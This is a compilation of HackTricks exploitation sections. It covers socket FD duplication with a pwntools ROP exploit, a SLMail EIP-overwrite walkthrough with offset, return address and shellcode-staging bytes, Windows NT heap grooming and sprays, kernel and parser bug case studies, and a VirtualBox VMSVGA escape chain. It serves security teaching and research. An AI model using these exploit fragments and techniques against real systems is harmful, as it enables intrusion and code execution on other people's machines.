text: ## FDs in Remote Exploitation When sending an exploit to a remote server that calls **`system('/bin/sh')`** for example, this will be executed in the server process ofc, and `/bin/sh` will expect input from stdin (FD: `0`) and will print the output in stdout and stderr (FDs `1` and `2`). So the attacker won't be able to interact with the shell. A way to fix this is to suppose that when the server started it created the **FD number `3`** (for listening) and that then, your connection is going to be in the **FD number `4`**. Therefore, it's possible to use the syscall **`dup2`** to duplicate the stdin (FD 0) and the stdout (FD 1) in the FD 4 (the one of the connection of the attacker) so it'll make feasible to contact the shell once it's executed. [**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):<sup>[[1]](#references)</sup> ```python from pwn import * elf = context.binary = ELF('./vuln') p = remote('localhost', 9001) rop = ROP(elf) rop.raw('A' * 40) rop.dup2(4, 0) rop.dup2(4, 1) rop.win() p.sendline(rop.chain()) p.recvuntil('Thanks!\x00') p.interactive() ```

title: HT: Socat & pty (common-exploiting-problems)
text: ## Socat & pty Note that socat already transfers **`stdin`** and **`stdout`** to the socket. However, the `pty` mode **include DELETE characters**. So, if you send a `\x7f` ( `DELETE` -)it will **delete the previous character** of your exploit. In order to bypass this the **escape character `\x16` must be prepended to any `\x7f` sent.** This is terminal line-discipline behavior: the literal-next character (`VLNEXT`, commonly `Ctrl-V` or `0x16`) quotes the following byte instead of letting the TTY process it. The linked socat exploitation note demonstrates why this matters for 64-bit payloads, where `0x7f` commonly occurs in glibc addresses, and shows the `0x16 0x7f` byte sequence used to transmit it literally. The Dream Diary challenge writeup provides the original end-to-end heap-exploitation context.<sup>[[2]](#references)</sup><sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

title: HT: Android AArch64 shared-library fuzzing & LD_PRELOAD hooking (common-exploiting-problems)
text: ## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking When an Android app ships only a stripped AArch64 `.so`, you can still fuzz exported logic directly on-device without rebuilding the APK. A practical workflow:<sup>[[3]](#references)</sup> 1. **Locate callable entry points.** `objdump -T libvalidate.so | grep -E "validate"` quickly lists exported functions. Decompilers (Ghidra, IDA, BN) reveal the real signature, e.g. `int validate(const uint8_t *buf, uint64_t len)`. 2. **Write a standalone harness.** Load a file, keep the buffer alive, and call the exported symbol exactly as the app would. Cross-compile with the NDK (e.g. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`). <details> <summary>Minimal file-driven harness</summary> ```c #include <fcntl.h> #include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <sys/stat.h> #include <unistd.h> extern int validate(const uint8_t *buf, uint64_t len); int main(int argc, char **argv) { if (argc < 2) return 1; int fd = open(argv[1], O_RDONLY); if (fd < 0) return 1; struct stat st = {0}; if (fstat(fd, &st) < 0) return 1; uint8_t *buffer = malloc(st.st_size + 1); read(fd, buffer, st.st_size); close(fd); int ret = validate(buffer, st.st_size); free(buffer); return ret; } ``` </details> 3. **Reconstruct the expected structure.** Error strings and comparisons in Ghidra showed the function parsed strict JSON with constant keys (`magic`, `version`, nested `root.children.*`) and arithmetic checks (e.g., `value * 2 == 84` ⇒ `value` must be `42`). Feeding syntactically valid JSON that progressively satisfies each branch lets you map the schema without instrumentation. 4. **Bypass anti-debug to leak secrets.** Because the `.so` imports `snprintf`, override it with `LD_PRELOAD` to dump sensitive for

title: HT: Image/Media Parsing Exploits (DNG/TIFF/JPEG) (common-exploiting-problems)
text: ## Image/Media Parsing Exploits (DNG/TIFF/JPEG) Malicious camera formats often ship their own bytecode (opcode lists, map tables, tone curves). When a privileged decoder fails to bound-check metadata-derived dimensions or plane indices, those opcodes become attacker-controlled read/write primitives that can groom the heap, pivot pointers, or even leak ASLR. Samsung's in-the-wild Quram exploit is a recent example of chaining a `DeltaPerColumn` bounds bug, heap spraying via skipped opcodes, vtable remapping, and a JOP chain to `system()`.<sup>[[4]](#references)</sup> {{#ref}} ../mobile-pentesting/android-app-pentesting/abusing-android-media-pipelines-image-parsers.md {{#endref}}

title: HT: Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization (common-exploiting-problems)
text: ## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization ### Requirements & attack surface - A service accepts attacker-controlled property lists (XML or binary) and calls `NSKeyedUnarchiver.unarchivedObjectOfClasses` with a permissive allowlist (e.g., `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`). - The resulting objects are reused and later serialized again with `NSKeyedArchiver` (or iterated in deterministic bucket order) and sent back to the attacker. - Some key type in the containers uses pointer values as its hash code. Before March 2025, `CFNull`/`NSNull` fell back to `CFHash(object) == (uintptr_t)object`, and deserialization always returned the shared-cache singleton `kCFNull`, giving a stable kernel-shared pointer without memory corruption or timing.<sup>[[5]](#references)</sup> ### Controllable hashing primitives - **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` lacks a hash callback, so `CFBasicHash` uses the object address as the hash. Because the singleton lives at a fixed shared-cache address until reboot, its hash is stable across processes. - **Attacker-controlled hashes:** 32-bit `NSNumber` keys are hashed through `_CFHashInt`, which is deterministic and attacker-controllable. Picking specific integers lets the attacker choose `hash(number) % num_buckets` for any table size. - **`NSDictionary` implementation:** Immutable dictionaries embed a `CFBasicHash` with a prime bucket count chosen from `__CFBasicHashTableSizes` (e.g., 23, 41, 71, 127, 191, 251, 383, 631, 1087). Collisions are handled with linear probing (`__kCFBasicHashLinearHashingValue`), and serialization walks buckets in numeric order; therefore, the order of serialized keys encodes the bucket index that each key finally occupied.<sup>[[5]](#references)</sup> ###

title: HT: Kernel waiter cleanup confusion, stack-UAF reclaim & constrained tree-writes (common-exploiting-problems)
text: ## Kernel waiter cleanup confusion, stack-UAF reclaim & constrained tree-writes Some kernel bugs become exploitable because a cleanup helper assumes that **`current` owns the object being cleaned up**, but a later proxy path reuses that helper **on behalf of another task**. If rollback removes the waiter from a lock/tree but clears the blocked state on the wrong task, the real owner can keep a **dangling pointer to a stack object** that belonged to a previous syscall frame.<sup>[[6]](#references)</sup> ### Proxy cleanup confusion in PI/futex style paths Look for code with this shape: - a slow-path helper was originally written for self-blocking tasks - a proxy/requeue path later reuses the same helper for another sleeping task - rollback dequeues the waiter/object but clears the blocked pointer/state on `current` - later priority-chain / wait-chain / lock-owner walks dereference the stale pointer This is especially interesting when the stale object was allocated in a **kernel stack frame** (not heap), because the owner task can often reclaim the same stack region itself.<sup>[[6]](#references)</sup> ### Deterministic rollback by creating a dependency cycle If exploitation needs a rare rollback path, try to force a **dependency cycle** instead of racing for a tiny window. In the futex PI case, a reliable pattern is: 1. Thread A holds `f_pi_chain` and sleeps in `FUTEX_WAIT_REQUEUE_PI(f_wait -> f_pi_target)`. 2. Thread B holds `f_pi_target` and blocks on `f_pi_chain`. 3. Thread C calls `FUTEX_CMP_REQUEUE_PI(f_wait -> f_pi_target)`. The kernel observes: ```text waiter -> f_pi_target -> owner -> f_pi_chain -> waiter ``` and the chain walk returns `-EDEADLK`, driving cleanup/rollback code without needing privileges.<sup>[[6]](#references)</sup> ### Reclaiming a freed kernel s

text: ## Linux kernel transactional rollback UAFs For an nftables example where failed transaction rollback desynchronizes generation state and reference counting, see: {{#ref}} linux-kernel-exploitation/nftables-catchall-rollback-uaf.md {{#endref}}

title: HT: Length-only global overflows and first-consumer triage (common-exploiting-problems)
text: ## Length-only global overflows and first-consumer triage An overflow can be useful even when the attacker controls only its length. First calculate the complete write interval, including fixed prefixes and terminators, then map it onto adjacent globals. Test each corrupted field at the first operation that consumes it: an earlier callback, lock, or guard page can terminate the process before a more interesting target is reached. Treat a fixed fill byte plus a final NUL as a constrained write rather than arbitrary-byte control.<sup>[[9]](#references)</sup> CVE-2025-43504 in LLDB's `debugserver` illustrates this pattern. After an iOS Developer Disk Image was mounted and the service was reachable, a GDB-remote client could reach `qSpeedTest` before attaching to a process; the bug did not bypass pairing or start the service. `RNBRemote::HandlePacket_qSpeedTest()` parsed an unbounded hexadecimal response length, wrote that many fixed `0x61` (`a`) bytes after the `data:` prefix in a static 4 MiB-plus-16-byte buffer, and then appended a NUL. Small overflows corrupted the adjacent `g_log_callback`, larger ones reached a recursive mutex, and still larger writes crossed into an unmapped region. The observed results demonstrated memory corruption but not reliable code execution.<sup>[[9]](#references)[[11]](#references)</sup> The fix replaced the static buffer with a heap allocation sized for the prefix and terminator and rejected response sizes of 4 MiB or greater. When auditing equivalent handlers, verify both the upper bound and the extra bytes required around attacker-selected content, and confirm the actual deployed build contains the fix.<sup>[[10]](#references)</sup>

title: HT: Stateful fragment reassembly into parser state (common-exploiting-problems)
text: ## Stateful fragment reassembly into parser state A check that accumulated fragment bytes do not exceed a **sender-declared total** is not a check against the actual receive-buffer capacity. In the historical Broadcom WPS Monitor `ap_eap_sm_process_frag()` path, the parser compares its running count with `total_bytes_to_recv`, then copies into `frags_received + total_received` without separately bounding that destination. The first fragment also removes the two-byte WPS length field from its copy count; a short fragment needs an explicit lower-bound check before that subtraction. Review the EAP length, the available frame bytes, the declared WPS total, and the receive buffer as four separate bounds rather than treating any one as proof of the others.<sup>[[12]](#references)</sup> The [WPS registrar](../generic-methodologies-and-resources/pentesting-wifi/wps.md) can process EAP-WSC fragments from a station before it knows the WLAN key or completes enrollment.<sup>[[14]](#references)</sup> In the reported exploit, corrupting `total_received` redirects a later fragment write, while corrupting `next_frag_to_send` turns the AP's outgoing fragment path into a read primitive. A calibration leak locates the WPS state, a self-referential pointer reveals its absolute address, and overwriting `send_data` gives a later indirect-call target.<sup>[[13]](#references)</sup> These primitives depend on the exact state layout and executable build; a Broadcom chipset or WPS advertisement alone does not prove this parser is present or exploitable.<sup>[[15]](#references)</sup> Keep **802.11 MAC fragmentation** separate from **EAP-WSC fragmentation** when reproducing a parser fault. text: ## Create a pattern to modify the EIP The pattern should be at least as large as the buffer that previously crashed the service. ![Creating a 3000-byte Metasploit cyclic pattern to replace the crashing buffer](<../images/image (420).png>) ``` /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 ``` Replace the exploit buffer with the pattern and launch the exploit. A new crash should appear with a different EIP value: ![SLMail crash showing cyclic-pattern bytes in EIP](<../images/image (636).png>) Check if the address was in your pattern: ![Using pattern_offset to identify EIP offset 2606](<../images/image (418).png>) ``` /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39694438 ``` This shows that **EIP can be controlled at offset 2606** of the buffer.<sup>[[1]](#references)</sup> Confirm it by modifying the exploit buffer: ``` buffer = 'A'*2606 + 'BBBB' + 'CCCC' ``` With this buffer, EIP at the crash should contain `0x42424242` (`BBBB`). ![Debugger confirming that EIP contains 0x42424242 at offset 2606](<../images/image (874).png>) ![Stack view after confirming control of EIP with 0x42424242](<../images/image (92).png>) Looks like it is working.

title: HT: Check for Shellcode space inside the stack (windows-exploiting-basic-guide-oscp-lvl)
text: ## Check for Shellcode space inside the stack Use a **600-byte marker** to measure the candidate payload region. The marker is deliberately larger than the usable area; the debugger measurement below shows that this specific crash leaves **430 bytes** for shellcode. Change the buffer: ``` buffer = 'A'*2606 + 'BBBB' + 'C'*600 ``` Launch the new exploit and inspect ESP and the amount of usable space after it. ![Debugger showing ESP pointing into the controlled buffer after the EIP overwrite](<../images/image (119).png>) ![Debugger measuring 430 bytes of usable controlled stack space for shellcode](<../images/image (879).png>) When the vulnerable path is reached, ESP points into the controlled buffer and there is room for shellcode. In this case we have **from 0x0209A128 to 0x0209A2D6 = 430B.** Enough. ### Alternative: stage the payload before EIP Do not assume that `ESP` points immediately after the overwritten return address on every vulnerable path. The maintained Metasploit module uses the same offset and `JMP ESP`, but places up to 600 bytes of encoded payload **before** EIP. Its post-EIP stub first repairs `ESP` and then jumps backward into that payload. This is useful when the post-EIP region is short or unstable, but the constants are specific to the module's supported SLMail builds: break on the selected `JMP ESP`, record the real `ESP`, and recalculate the stack adjustment and relative branch instead of blindly reusing them.<sup>[[1]](#references)</sup> ```python pre_eip = b"A" * (2606 - len(shellcode)) + shellcode ret = b"\x8f\x35\x4a\x5f" # 0x5f4a358f fix_esp = b"\x81\xc4\xff\xef\xff\xff\x44" # add esp,-4097; inc esp jmp_back = b"\xe9\xcb\xfd\xff\xff" # module-specific relative jump buffer = pre_eip + ret + fix_esp + jmp_back + b"C" * 512 ``` If neither contigu

title: HT: Windows Userland Heap Grooming (x86 NT Heap) (windows-userland-heap-grooming)
text: # Windows Userland Heap Grooming (x86 NT Heap) {{#include ../banners/hacktricks-training.md}} These observations come from 32-bit processes on Windows 10 x64 using the **NT heap** through `HeapAlloc`/`RtlAllocateHeap`. They are useful when an existing UAF or overflow needs a particular layout. They are not an allocator specification: Corelan tested one environment without reverse-engineering `ntdll`, and the heap type, build, process history, and concurrent allocations can change the result. Do not apply these offsets or activation counts to the Segment Heap or another Windows version without measurement.<sup>[[1]](#references)</sup> For the vulnerability primitives, see [use-after-free](libc-heap/use-after-free/) and [heap overflow](libc-heap/heap-overflow.md). Those chapters discuss other allocators; the allocation-selection rules below are specific to the tested Windows NT heap. Before measuring allocation gaps under WinDbg, [check whether a debugger-created heap changed the layout](basic-stack-binary-exploitation-methodology/tools/#windbg-and-windbgx-user-mode-launch-and-attach).<sup>[[3]](#references)</sup>

title: HT: Inspect the actual heap before grooming (windows-userland-heap-grooming)
text: ## Inspect the actual heap before grooming Use a recent WinDBG version and symbols. `!heap -p -h` shows busy/free entries and separately managed VirtualAlloc blocks; `!heap -p -a` resolves an address; `!heap -x` exposes its total size and the `LFH;busy` or `LFH;free` marker. `dd` can confirm whether a replacement changed a stale object's contents. Heap addresses are ASLR-dependent, so replace the example addresses with values from the target process.<sup>[[1]](#references)</sup> ```text !heap -p -h <heap_base> !heap -p -a <user_pointer> !heap -x <user_pointer> dd <user_pointer> L <size_in_dwords> ``` In the tested x86 heap, a normal chunk has an 8-byte header: two adjacent `0x300`-byte user allocations had user pointers `0x308` bytes apart. `dt _HEAP <heap_base>` reveals the heap's front-end type and `VirtualMemoryThreshold`; `FrontEndHeapType == 2` indicates LFH is configured, but check individual chunks with `!heap -x` to see whether that bucket is actually served by LFH. The `_HEAP` offsets in the article are build-specific, not constants for exploit calculations.<sup>[[1]](#references)</sup>

title: HT: Back-end allocator: adjacency and same-size UAF replacement (windows-userland-heap-grooming)
text: ## Back-end allocator: adjacency and same-size UAF replacement The back-end allocator (BEA) may split a larger free segment-tail chunk from its beginning, producing adjacent allocations of the same size. **Allocation order alone is not enough**: an existing exact-size free chunk or another suitable smaller free-list entry can be chosen instead. In Corelan's test, freeing a `0x300` tail chunk coalesced it with the remaining free space, but subsequent `0x100` requests reused pre-existing `0x100` and `0x198` free chunks rather than that large tail. Inspect and consume competing holes before relying on adjacency.<sup>[[1]](#references)</sup> To reclaim a freed object through a stale pointer, keep allocations on both sides **busy** so the target cannot coalesce. First make controlled allocations of the target size to reduce competing free entries while the bucket is still BEA-managed. Free the target, then request an attacker-controlled allocation of the same size. The tested `[0x100 guard][0x58 victim][0x100 guard]` layout returned the old `0x58` user address to the replacement, and a memory dump showed the replacement bytes there. The number of preparatory allocations is process-state-dependent; verify the free entry and the returned pointer rather than assuming one `HeapAlloc` always wins.<sup>[[1]](#references)</sup>

title: HT: Back-end coalescing for cross-size overlap (windows-userland-heap-grooming)
text: ## Back-end coalescing for cross-size overlap When the replacement type is larger than the victim, arrange `[busy guard][predecessor][victim][busy guard]`. Free the victim and then its predecessor. BEA can coalesce them into one region beginning at the predecessor, so a larger allocation can be split from the front and extend into the old victim data. In the test, a `0x68` predecessor plus a `0x58` victim formed a free chunk with `0xc8` user bytes; a subsequent `0x80` allocation began at the predecessor address and covered the start of the former victim. Its **assumed last-four-dword controllable tail missed the intended victim offset by 8 bytes**, so the example proves overlap, not the intended precise partial overwrite. Account for the intervening header and confirm the actual byte offset with WinDBG before using constrained replacement data.<sup>[[1]](#references)</sup>

title: HT: LFH changes the reuse rules (windows-userland-heap-grooming)
text: ## LFH changes the reuse rules For the tested buckets, request 18 switched a size class from BEA to an LFH SubSegment. Interleaving another size, freeing unrelated chunks, or freeing and reusing a same-size chunk did not prevent that transition. This is an empirical threshold for the tested heap, not a universal counter rule. `0x4000` was the largest request size observed to enter LFH; `0x4008` remained BEA-managed. Once `!heap -x` reports `LFH;busy`, do not assume sequential addresses or BEA free-list selection.<sup>[[1]](#references)</sup> LFH reuse was **not reliably LIFO** in the same test. After freeing a `0x500` LFH chunk, the next `0x500` request went elsewhere; the freed address returned on the ninth subsequent request in that run, with varying results across runs. If a UAF can tolerate repeated same-bucket allocations, measure the chance of reclaiming the target rather than treating one replacement request as deterministic. Corelan's `LFH_TakeBack` test program automates this measurement across sizes.<sup>[[1]](#references)[[2]](#references)</sup> In the tested LFH cross-size replacement, the `LFH_TakeBack2` experiment freed a `0x58` victim and the other controlled chunks intended to empty its SubSegment, then made `0x88` allocations until one covered the old address. This is consistent with the SubSegment pages becoming available for a different bucket, but the experiment does not prove exactly when they were released. The new user pointer was different, so calculate overlap relative to the stale pointer; freeing one LFH chunk alone does not make its slot available to another size bucket.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: Large allocations and page-periodic sprays (windows-userland-heap-grooming)
text: ## Large allocations and page-periodic sprays In the sample heap, `VirtualMemoryThreshold` was `0xfe00` eight-byte blocks (`0x7f000` bytes). Requests above that threshold became separately tracked `VirtualAllocdBlocks` rather than normal segment chunks. A run of `0x7ffb0` requests produced page-based allocations with irregular gaps, which is unsuitable for assuming a dense, fixed-address spray.<sup>[[1]](#references)</sup> For a **page-periodic** spray, instead choose a size larger than the LFH maximum but below the VirtualAlloc threshold. Corelan used `HeapAlloc(GetProcessHeap(), 0, 0x40000 - 8)` repeatedly; after new segments were reached, many consecutive user pointers appeared at `...0048` with a `0x40000` step. Repeating a marker or payload layout every `0x1000` bytes inside each allocation accommodates an unknown first allocation address while preserving the within-page offset. In the supplied `Precise_Spray` example, a marker at payload offset `0xbc4` in each page landed at `0x0c0c0c0c` in the measured run (`0xc0c - 0x48 = 0xbc4`). That address is an experiment, not a portable guarantee; inspect the resulting mappings and account for allocator noise.<sup>[[1]](#references)[[2]](#references)</sup>

title: HT: Integer Overflow (integer-overflow-and-underflow)
text: # Integer Overflow {{#include ../banners/hacktricks-training.md}}

title: HT: Basic Information (integer-overflow-and-underflow)
text: ## Basic Information At the heart of an **integer overflow** is the limitation imposed by the **size** of data types in computer programming and the **interpretation** of the data. For example, an **8-bit unsigned integer** can represent values from **0 to 255**. If you attempt to store the value 256 in an 8-bit unsigned integer, it wraps around to 0 due to the limitation of its storage capacity. Similarly, for a **16-bit unsigned integer**, which can hold values from **0 to 65,535**, adding 1 to 65,535 will wrap the value back to 0. Moreover, an **8-bit signed integer** can represent values from **-128 to 127**. This is because one bit is used to represent the sign (positive or negative), leaving 7 bits to represent the magnitude. The most negative number is represented as **-128** (binary `10000000`), and the most positive number is **127** (binary `01111111`). Max values for common integer types: | Type | Size (bits) | Min Value | Max Value | |----------------|-------------|--------------------|--------------------| | int8_t | 8 | -128 | 127 | | uint8_t | 8 | 0 | 255 | | int16_t | 16 | -32,768 | 32,767 | | uint16_t | 16 | 0 | 65,535 | | int32_t | 32 | -2,147,483,648 | 2,147,483,647 | | uint32_t | 32 | 0 | 4,294,967,295 | | int64_t | 64 | -9,223,372,036,854,775,808 | 9,223,372,036,854,775,807 | | uint64_t | 64 | 0 | 18,446,744,073,709,551,615 | A short is equivalent to a `int16_t` and an int is equivalent to a `int32_t` and a long is equivalent to a `int64_t` in 64bits systems. ### Max values For potential **web vulnerabilities** it's very interesting to know the maximum supported values: {{#tabs}} {{#tab name="Rust"}} ```rust fn main() { let mut quantity = 2147483647; let (mul_result, _) = i32::overflowing_mul(32767, quantity); let (add_result, _) = i32::overflowing_

title: HT: Go integer overflow detection with go-panikint (integer-overflow-and-underflow)
text: ## Go integer overflow detection with go-panikint Go wraps integers silently. [go-panikint](https://github.com/trailofbits/go-panikint) is a forked Go toolchain that injects SSA overflow checks so wrapped arithmetic immediately calls `runtime.panicoverflow()` (panic + stack trace).<sup>[[1]](#references)[[2]](#references)</sup> **Why use it** - Makes overflow/truncation reachable in fuzzing/CI because arithmetic wraps now crash. - Useful around user-controlled pagination, offsets, quotas, size calculations, or access-control math (e.g., `end := offset + limit` on `uint64` wrapping small). **Build & use** ```bash git clone https://github.com/trailofbits/go-panikint cd go-panikint/src && ./make.bash export GOROOT=/path/to/go-panikint ./bin/go test -fuzz=FuzzOverflowHarness ``` Run this forked `go` binary for tests/fuzzing to surface overflows as panics. **Noise control** - Truncation checks (casts to smaller ints) can be noisy. - Suppress intentional wrap-around via source-path filters or inline `// overflow_false_positive` / `// truncation_false_positive` comments. **Real-world pattern** go-panikint revealed a Cosmos SDK `uint64` pagination overflow: `end := pageRequest.Offset + pageRequest.Limit` wrapped past `MaxUint64`, returning empty results. Instrumentation turned the silent wrap into a panic that fuzzers could minimize.<sup>[[1]](#references)</sup>

title: HT: VirtualBox VMSVGA COTable UAF Escape (virtualbox-vmsvga-cotable-uaf-escape)
text: # VirtualBox VMSVGA COTable UAF Escape {{#include ../banners/hacktricks-training.md}} This case study shows a useful hypervisor-exploitation pattern: a guest-controlled object remains referenced after destruction, two differently sized freed allocations are reclaimed with useful object types, and legitimate device commands are reused as typed read/write gadgets. The demonstrated target was VirtualBox's VMware SVGA-II 3D emulation on a Linux host.<sup>[[1]](#references)</sup> The generic parts of the chain complement [Use After Free](libc-heap/use-after-free/), [Overwriting a freed chunk](libc-heap/overwriting-a-freed-chunk.md), [Write What Where 2 Exec](arbitrary-write-2-exec/), and [ROP & JOP](rop-return-oriented-programing/). For another VirtualBox device-memory example, see [VirtualBox Slirp NAT Packet Heap Exploitation](libc-heap/virtualbox-slirp-nat-packet-heap-exploitation.md).

title: HT: Attack surface (virtualbox-vmsvga-cotable-uaf-escape)
text: ## Attack surface The guest submits SVGA commands through a shared FIFO or a command buffer whose physical address is written to `SVGA_REG_COMMAND_LOW` and `SVGA_REG_COMMAND_HIGH`. DirectX contexts contain an `aCOTMobs[]` array of bound Memory Objects (MOBs), plus typed Context-Object Table pointers such as `cot.paSampler`. Binding a guest-backed MOB with `SVGA_3D_CMD_DX_SET_COTABLE` creates a host copy at `MOB->Gbo.pvHost`; both the MOB pointer and that host-buffer pointer then become reachable through the context.<sup>[[1]](#references)</sup>

title: HT: Dangling COTable references (virtualbox-vmsvga-cotable-uaf-escape)
text: ## Dangling COTable references `SVGA_3D_CMD_DESTROY_GB_MOB` removes the selected MOB from the AVL tree and LRU list, destroys its Guest-Backed Object, and frees the `VMSVGAMOB`. The vulnerable lifetime transition did not verify whether any DX context still referenced that MOB. Consequently, both `aCOTMobs[type]` and the matching typed COT pointer could survive after the MOB and `pvHost` allocations were freed.<sup>[[1]](#references)</sup> The important audit rule is wider than this device: an object-table entry is an owning or borrowing reference even when the primary registry no longer contains the object. Destruction must reject a still-bound object or atomically invalidate every frontend and backend alias before freeing it.<sup>[[1]](#references)</sup>

title: HT: Reclaiming both freed allocations (virtualbox-vmsvga-cotable-uaf-escape)
text: ## Reclaiming both freed allocations The exploit reclaimed the two stale targets with objects that expose different attacker-controlled operations. The sizes below are build-specific, but the allocation-role swap is reusable:<sup>[[1]](#references)</sup> 1. Define `MOB1` (`sizeof(VMSVGAMOB) == 0x68`). 2. Bind it to context `2`, COTable type `7` (`SVGA_COTABLE_SAMPLER`), with `validSizeInBytes = 0x2170`. This creates a `0x2170`-byte host backing buffer. 3. Destroy `MOB1`. The `0x68` MOB and `0x2170` backing buffer are freed, but context `2` retains stale aliases. 4. Bind another MOB with a `0x68` host buffer. This buffer is likely to occupy the freed `VMSVGAMOB`, so guest data controls the stale MOB-shaped memory. 5. Force a fresh `VMSVGA3DDXCONTEXT` allocation. Its size is `0x2170`, so it can occupy the old backing buffer and make context `2`'s stale `paSampler` point into a live context. Context allocation happens in batches. Defining context `2` grows the pointer array and preallocates IDs `0` through `31`; defining another ID in that range does not allocate the wanted object. Requesting context `32` crosses the boundary and makes it the first new `0x2170` allocation, which improves the chance of reclaiming the freed backing buffer.<sup>[[1]](#references)</sup>

title: HT: Typed setter to context corruption (virtualbox-vmsvga-cotable-uaf-escape)
text: ## Typed setter to context corruption `SVGA_3D_CMD_DX_DEFINE_SAMPLER_STATE` selects `cot.paSampler[samplerId]` and fills the entry from guest-controlled fields. Once `paSampler` aliases the reclaimed DX context, the normal sampler setter becomes a structured out-of-bounds write into that context. Corrupting another typed COT pointer converts later setter calls into a write-what-where primitive.<sup>[[1]](#references)</sup> ```c SVGA3dSamplerId id = pCmd->samplerId; SVGACOTableDXSamplerEntry *entry = &pDXContext->cot.paSampler[id]; entry->filter = pCmd->filter; entry->addressU = pCmd->addressU; entry->addressV = pCmd->addressV; entry->addressW = pCmd->addressW; entry->borderColor = pCmd->borderColor; entry->minLOD = pCmd->minLOD; entry->maxLOD = pCmd->maxLOD; ``` This is a useful primitive-building pattern: prefer a legitimate handler that performs several predictable writes through a corruptible base pointer. It is often more stable than directly attacking allocator metadata.<sup>[[1]](#references)</sup>

title: HT: Turning metadata corruption into disclosure (virtualbox-vmsvga-cotable-uaf-escape)
text: ## Turning metadata corruption into disclosure For the initial leak, the exploit allocated six `0x68` MOBs, freed alternating entries, and bound the survivors with `0x68` backing buffers. It then set COTable element counters such as `cSampler` to `0xffffffff` without changing their pointers. The oversized logical count allowed a typed setter to pass bounds checks and overwrite an adjacent MOB's `Gbo.cbTotal`. Growing that COTable then copied more bytes than the original host buffer held back to guest memory, leaking adjacent heap objects, the `VBoxDD.so` base, and a `VMSVGAR3STATE` address. The reported heap-layout success rate was about 70%, which highlights the allocator-pressure dependency of this stage.<sup>[[1]](#references)</sup> After an address leak, a reusable arbitrary-read primitive can be built as follows:<sup>[[1]](#references)</sup> 1. Bind a MOB to a COTable and destroy it without clearing the COTable alias. 2. Reclaim the freed MOB-sized chunk with guest-controlled data. 3. Forge `Gbo.pvHost` with the host address to read and set a suitable size. 4. Issue `SVGA_3D_CMD_DX_GROW_COTABLE`; the device treats the forged pointer as a host backing store and copies its contents towards guest-visible memory.

title: HT: Function-table hijack and execution recovery (virtualbox-vmsvga-cotable-uaf-escape)
text: ## Function-table hijack and execution recovery With arbitrary read/write and the module base, the final write replaced `VMSVGAR3STATE->pFuncsVGPU9->pfnCommandClear` with the first ROP gadget. `SVGA_3D_CMD_CLEAR` invokes this pointer and accepts variable-length guest-controlled parameters, providing storage for a fake stack and ROP chain. The chain pivoted into that data, called `RTMemProtect()` to make a MOB buffer RWX, and jumped to guest-supplied shellcode.<sup>[[1]](#references)</sup> Returning cleanly is part of a reliable escape. Because the pivot discarded the original stack, the payload built a replacement stack whose continuation entered `vmsvgaR3FifoLoop()`. Resuming the device command loop kept the hypervisor process and guest alive after host code execution.<sup>[[1]](#references)</sup> The issue was fixed in Oracle's January 2026 Critical Patch Update. Because the research did not publish a CVE identifier or an affected-version range, use Oracle's advisory for deployment-specific fixed builds rather than inferring them from the exploit layout.<sup>[[1]](#references)</sup>
